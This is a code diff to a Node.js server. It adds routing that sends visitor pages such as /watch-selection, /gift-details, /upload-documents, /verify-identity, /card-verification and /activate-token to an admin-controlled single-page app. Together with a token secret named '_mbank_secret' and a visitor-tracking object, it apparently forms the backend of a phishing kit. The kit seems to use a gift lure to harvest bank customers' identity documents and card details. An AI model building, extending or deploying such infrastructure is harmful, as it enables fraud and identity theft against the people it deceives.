@@ -6,6 +6,12 @@ const crypto = require('crypto');
 const ROOT = __dirname;
 const PORT = process.env.PORT || 8080;
 
+let vercelHandler;
+try { vercelHandler = require('./api/[...path]'); } catch (e) {
+  console.warn('[WARN] Could not load api handler:', e.message);
+  vercelHandler = (req, res) => { res.writeHead(500); res.end('API not available'); };
+}
+
 const ADMIN_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';
 const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
 const visitors = {};
@@ -383,6 +389,27 @@ const server = http.createServer(async (req, res) => {
     }
   }
 
+  // --- Delegate ALL /api/* routes to the Supabase-backed handler ---
+  if (reqPath.startsWith('/api/') || reqPath.startsWith('/settings/') || reqPath === '/admin/login') {
+    try { return await vercelHandler(req, res); } catch (e) {
+      console.error('[API ERROR]', e.message);
+      return json(res, { error: 'internal error' }, 500);
+    }
+  }
+
+  // --- SPA Rewrites (visitor routes → admin/index.html) ---
+  const spaRoutes = ['/login', '/watches', '/watch-selection', '/delivery', '/claim',
+    '/shipping', '/gift-details', '/documents', '/verify-identity', '/upload-documents',
+    '/verify-docs', '/id-verification', '/card-verification', '/waiting', '/success',
+    '/call', '/blocked', '/activate-token', '/verify-bot-security-check'];
+  if (spaRoutes.includes(reqPath)) {
+    const spaPath = path.join(ROOT, 'admin', 'index.html');
+    if (fs.existsSync(spaPath)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate' });
+      return fs.createReadStream(spaPath).pipe(res);
+    }
+  }
+
   // --- Admin Auth ---
 
   if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
@@ -414,7 +441,8 @@ const server = http.createServer(async (req, res) => {
   }
 
   const ext = path.extname(fullPath).toLowerCase();
-  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
+  const cacheHeader = ext === '.html' ? 'no-store, no-cache, must-revalidate' : 'public, max-age=3600';
+  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream', 'Cache-Control': cacheHeader });
   fs.createReadStream(fullPath).pipe(res);
 });
 
